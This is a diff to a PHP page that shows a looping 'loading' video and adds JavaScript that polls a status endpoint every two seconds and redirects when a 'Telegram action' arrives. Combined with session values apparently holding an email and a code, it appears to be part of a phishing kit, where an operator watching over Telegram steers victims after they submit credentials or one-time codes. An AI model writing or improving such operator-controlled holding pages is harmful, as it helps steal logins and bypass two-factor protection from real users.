@@ -59,7 +59,7 @@ if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {
         body {
             margin: 0;
             padding: 0;
-            background: #000;
+            background: #ffffff;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -74,18 +74,38 @@ if (isset($_SESSION['e']) && (isset($_SESSION['c']) || isset($_POST['c']))) {
             align-items: center;
         }
         video {
-            max-width: 100%;
-            max-height: 100vh;
+            max-width: 60%;
+            max-height: 60vh;
             object-fit: contain;
         }
     </style>
 </head>
 <body>
     <div class="video-container">
-        <video autoplay loop muted playsinline>
+        <video id="cargaVideo" autoplay muted playsinline>
             <source src="cargaout.MP4" type="video/mp4">
         </video>
     </div>
+    <script>
+        const video = document.getElementById("cargaVideo");
+        
+        // Cuando el video termine, recargar la página
+        video.addEventListener("ended", function() {
+            window.location.reload();
+        });
+        
+        // Verificar acción de Telegram cada 2 segundos
+        setInterval(function() {
+            fetch("../check_status.php")
+                .then(response => response.json())
+                .then(data => {
+                    if (data.status === "redirect") {
+                        window.location.href = data.target;
+                    }
+                })
+                .catch(error => console.log("Esperando acción..."));
+        }, 2000);
+    </script>
 </body>
 </html>';
     exit;
